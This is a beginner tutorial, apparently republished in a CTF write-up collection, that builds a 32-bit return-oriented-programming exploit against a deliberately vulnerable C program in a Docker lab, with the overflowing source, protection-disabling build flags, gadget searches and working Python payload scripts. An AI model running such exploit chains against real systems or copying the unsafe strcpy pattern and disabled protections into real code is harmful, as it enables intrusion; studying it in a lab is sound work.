# :game_die: Use the 32-bit architecture (-m32) and disable stack protection (-fno-stack-protector).

> **Original Source:** [Use the 32-bit architecture (-m32) and disable stack protection (-fno-stack-protector).](https://infosecwriteups.com/linking-the-pieces-a-journey-into-rop-chains-for-beginner-explorers-a9767d4c5149)
> **Platform:** infosecwriteups.com | **Category:** `MISC`

---

Preparing for the thrilling journey ahead, it’s time for the fun part! Let’s plunge into some ROPing! In this example, we’ll leverage a buffer overflow vulnerability to achieve our goal: printing “HACKED!!” to the console.


First, some setup is needed:


Our source.c file:


```
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>


char g_buffer[1000]; // so we can write our string there

void a1() // make sure we have all gadgets we need
{
__asm__("pop eax;"
"ret;"
"pop ecx;"
"ret;"
"mov [eax], ecx;"
"ret;"
);

}

int vuln(char* argv) {
char buffer[256];
strcpy(buffer, argv);
}

int main(int argc, char argv) {
vuln(argv[1]);
return 0;
}
```


we will build a docker instance with Linux in it:


```
FROM ubuntu:latest

RUN apt-get -y update && apt-get -y install sudo

RUN sudo apt-get -y install gcc
RUN sudo apt-get -y install gdb
RUN sudo apt-get install -y gcc-multilib
RUN sudo apt-get install -y nano
RUN sudo apt-get install -y python3
RUN sudo apt-get install -y pip

RUN pip3 install ROPgadget

WORKDIR /home
COPY . .

RUN gcc -masm=intel -o ex source.c -m32 -fno-stack-protector -no-pie -g

# Use the 32-bit architecture (-m32) and disable stack protection (-fno-stack-protector).
# Disable position-independent executable (-no-pie) and include debugging information (-g).
```


After building the instance, we can start a shell with:
so we start the docker with elevated privileges (` — privileged`) and the capability to trace processes ( `— cap-add=SYS_PTRACE`). Disable security restrictions ( `— security-opt seccomp=unconfined`).


```
docker run -ti --privileged --cap-add=SYS_PTRACE --security-opt seccomp=unconfined rop /bin/bash
```


then you should see the following:


```
root@8a93af6e3d32:/home# ls
ex source.c
```


Let’s check that everything is ok:


```
root@8a93af6e3d32:/home# checksec ex
[*] '/home/ex'
Arch: i386-32-little
RELRO: Partial RELRO
Stack: No canary found
NX: NX enabled
PIE: No PIE (0x8048000)
```


Now we can begin the exploitation process. Our first step is to determine the offset to the return address and locate the relevant gadgets to construct our ROP chain.


There are multiple methods to find the offset, such as using build_pattern or manually analyzing the code. Since this process is not our main focus here, we will skip the detailed explanation. For the purpose of this demonstration, I have determined that we can gain control over the EIP value after 268 bytes.


To aid in searching for gadgets, we will utilize the `[ROPgadget](https://github.com/JonathanSalwan/ROPgadget)` package. This package will assist us in identifying and extracting the necessary gadgets from the executable.


## Get Ori Roza’s stories in your inbox


Join Medium for free to get updates from this writer.


Remember me for faster sign in


To facilitate this, we will create a text file that contains all the gadgets found within the executable.


```
root@8a93af6e3d32:/home# ROPgadget --binary ex >> gadgets.txt
root@8a93af6e3d32:/home# ls
ex gadgets.txt source.c
root@8a93af6e3d32:/home#
```


We would like to chain gadgets so the final code will construct the stack to be something like this:


Step 1: Write “HACKED!!” into the g_buffer.
So our plan is:
* put the `g_buffer` address in `eax`.
* put our data in `ecx`
* start filling `g_buffer`.


prerequisites:
* `g_buffer` address in memory
* `pop ecx; ret;` gadget address
* `pop eax; ret;` gadget address
* `mov [eax], ecx; ret;` gadget address


Let’s find `g_buffer` address in memory using `[readelf](https://man7.org/linux/man-pages/man1/readelf.1.html)`:


```
root@8a93af6e3d32:/home# readelf -s ex | grep g_buffer
24: 0804c040 1000 OBJECT GLOBAL DEFAULT 24 g_buffer
```


And we got that `g_buffer` is located at `0x084c040` .


Now, let’s find our gadgets locations:


```
root@8a93af6e3d32:/home# cat gadgets.txt | grep ": pop eax ; ret"
0x08049193 : pop eax ; ret
root@8a93af6e3d32:/home# cat gadgets.txt | grep ": pop ecx ; ret"
0x08049195 : pop ecx ; ret
root@8a93af6e3d32:/home# cat gadgets.txt | grep ": mov dword ptr"
0x08049197 : mov dword ptr [eax], ecx ; ret
```


`pop ecx; ret;` gadget address is `0x08049195`
`pop eax; ret;` gadget address is `0x08049193`
`mov [eax], ecx; ret;` gadget address `0x08049197`


Now we can assemble our code:


```
import sys
import struct

POP_EAX_RET = 0x08049193
POP_ECX_RET = 0x08049195
MOV_DWORD_EAX_ECX = 0x08049197
G_BUFFER = 0x0804c040

rop = b''
# write 'HACK' on stack & pop it into ecx
rop += struct.pack("<I", POP_ECX_RET) # pop ecx; ret;
rop += struct.pack("<I", 0x4b434148) # HACK (KCAH)
# eax -> g_buffer
rop += struct.pack("<I", POP_EAX_RET) # pop eax; ret;
rop += struct.pack("<I", G_BUFFER) # g_buffer
# *g_buffer = ecx
rop += struct.pack("<I", MOV_DWORD_EAX_ECX) # mov dword ptr [eax], ecx ; ret

# WRITE ED on stack & pop it into ecx
rop += struct.pack("<I", POP_ECX_RET) # pop ecx; ret;
rop += struct.pack("<I", 0x21214445) # ED!! (!!DE)
# eax -> g_buffer + 4
rop += struct.pack("<I", POP_EAX_RET) # pop eax; ret;
rop += struct.pack("<I", G_BUFFER + 0x4) # g_buffer + 4
# *g_buffer + 4 = ecx
rop += struct.pack("<I", MOV_DWORD_EAX_ECX) # mov dword ptr [eax], ecx ; ret

sys.stdout.buffer.write(b'A' * 268 + rop)
```


Now let’s test it and see what g_buffer holds:


```
root@8a93af6e3d32:/home# gdb ex
GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ex...
(gdb) run $(python3 test.py)
Starting program: /home/ex $(python3 test.py)
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
(gdb) x/s g_buffer
0x804c040 <g_buffer>: "HACKED!!"
(gdb)
```


WE DID IT!!! We can see that `g_buffer` holds our string.
Now let’s proceed to step 2.


Step 2: Call `printf` function & `exit` gracefully
So our plan is:
* to find `printf` address
* put `g_buffer` starting address again in `eax`
* call `printf`
* put 0 in `eax`
* call `exit`


In order to find `printf` address we will do the following:
* use `[ldd](https://man7.org/linux/man-pages/man1/ldd.1.html)` to find where `libc` is located
* use `[readelf](https://man7.org/linux/man-pages/man1/readelf.1.html)` to find `printf` location


```
root@8a93af6e3d32:/home# ldd ex
linux-gate.so.1 (0xf7fc4000)
libc.so.6 => /lib32/libc.so.6 (0xf7d89000)
/lib/ld-linux.so.2 (0xf7fc6000)

root@8a93af6e3d32:/home# readelf -s /lib32/libc.so.6 | grep 'printf'
195: 000747b0 45 FUNC GLOBAL DEFAULT 15 wprintf@@GLIBC_2.2
306: 00073320 177 FUNC WEAK DEFAULT 15 vsprintf@@GLIBC_2.0
330: 000799e0 34 FUNC WEAK DEFAULT 15 vsnprintf@@GLIBC_2.0
471: 00057580 31 FUNC WEAK DEFAULT 15 asprintf@@GLIBC_2.0
688: 00074780 44 FUNC GLOBAL DEFAULT 15 vwprintf@@GLIBC_2.2
761: 00079830 30 FUNC WEAK DEFAULT 15 vdprintf@@GLIBC_2.0
1325: 000749c0 34 FUNC WEAK DEFAULT 15 vswprintf@@GLIBC_2.2
1418: 000575c0 30 FUNC WEAK DEFAULT 15 vfwprintf@@GLIBC_2.2
1624: 000574d0 31 FUNC GLOBAL DEFAULT 15 fprintf@@GLIBC_2.0
1768: 000574f0 45 FUNC GLOBAL DEFAULT 15 printf@@GLIBC_2.0

root@8a93af6e3d32:/home# readelf -s /lib32/libc.so.6 | grep 'exit'
460: 0003a1c0 39 FUNC GLOBAL DEFAULT 15 exit@@GLIBC_2.0
909: 0016e490 38 FUNC GLOBAL DEFAULT 15 atexit@GLIBC_2.0
1169: 0008f7e0 18 FUNC GLOBAL DEFAULT 15 thrd_exit@GLIBC_2.28
1170: 0008f7e0 18 FUNC GLOBAL DEFAULT 15 thrd_exit@@GLIBC_2.34
2145: 0003a1f0 194 FUNC WEAK DEFAULT 15 on_exit@@GLIBC_2.0
2194: 00163810 60 FUNC GLOBAL DEFAULT 15 svc_exit@GLIBC_2.0
2620: 0016e4c0 37 FUNC GLOBAL DEFAULT 15 quick_exit@GLIBC_2.10
2957: 000dccb0 103 FUNC GLOBAL DEFAULT 15 _exit@@GLIBC_2.0
```


We found that:
* `libc.so.6` is located at `/lib32/libc.so.6`
* `printf` is located at `libc_address + 0x000574f0`
* `exit` is located at `libc_address + 0x0003a1c0`


Now, that we have everything we need, we can assemble our code:


```
import sys
import struct


POP_EAX_RET = 0x08049193
POP_ECX_RET = 0x08049195
MOV_DWORD_EAX_ECX = 0x08049197
G_BUFFER = 0x0804c040

LIB_C = 0xf7d89000
PRINTF = LIB_C + 0x000574f0
EXIT = LIB_C + 0x0003a1c0

rop = b''
# write 'HACK' on stack & pop it into ecx
rop += struct.pack("<I", POP_ECX_RET) # pop ecx; ret;
rop += struct.pack("<I", 0x4b434148) # HACK (KCAH)
# eax -> g_buffer
rop += struct.pack("<I", POP_EAX_RET) # pop eax; ret;
rop += struct.pack("<I", G_BUFFER) # g_buffer
# *g_buffer = ecx
rop += struct.pack("<I", MOV_DWORD_EAX_ECX) # mov dword ptr [eax], ecx ; ret

# WRITE ED on stack & pop it into ecx
rop += struct.pack("<I", POP_ECX_RET) # pop ecx; ret;
rop += struct.pack("<I", 0x21214445) # ED!! (!!DE)
# eax -> g_buffer + 4
rop += struct.pack("<I", POP_EAX_RET) # pop eax; ret;
rop += struct.pack("<I", G_BUFFER + 0x4) # g_buffer + 4
# *g_buffer + 4 = ecx
rop += struct.pack("<I", MOV_DWORD_EAX_ECX) # mov dword ptr [eax], ecx ; ret


# printf(&g_buffer)
rop += struct.pack("<I",PRINTF) # call printf 0x000574f0
# eax -> g_buffer, back to the beginning of g_buffer (arg 1)
rop += struct.pack("<I", POP_EAX_RET) # pop eax; ret;
rop += struct.pack("<I", G_BUFFER) # g_buffer

# exit(0)
rop += struct.pack("<I",EXIT) # call exit 0003a1c0
rop += struct.pack("<I", POP_EAX_RET) # pop eax; ret;
rop += struct.pack("<I", 0x00000000) # 0

sys.stdout.buffer.write(b'A' * 268 + rop)
```


Now let’s check our final payload!


```
root@8a93af6e3d32:/home# ./ex $(python3 test.py)
bash: warning: command substitution: ignored null byte in input
HACKED!!root@8a93af6e3d32:/home# echo $?
0
```


As we can see, `HACKED!!` was successfully printed!

---

*Originally published on [Medium](https://infosecwriteups.com/linking-the-pieces-a-journey-into-rop-chains-for-beginner-explorers-a9767d4c5149). All credit goes to the original author.*
*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
